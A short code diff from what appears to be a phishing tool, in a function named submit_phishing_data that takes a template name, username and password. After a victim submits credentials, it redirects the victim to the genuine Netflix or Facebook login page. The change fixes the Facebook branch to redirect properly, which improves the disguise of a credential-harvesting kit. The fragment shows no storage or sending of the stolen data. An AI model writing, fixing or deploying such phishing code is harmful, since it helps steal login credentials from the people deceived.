@@ -143,7 +143,7 @@ def submit_phishing_data(template, username, password):
     elif template == "netflix":
         return redirect('https://www.netflix.com/login')
     elif template == "facebook":
-        return render_template('https://www.facebook.com')
+        return redirect('https://www.facebook.com')
     return ""
 
 
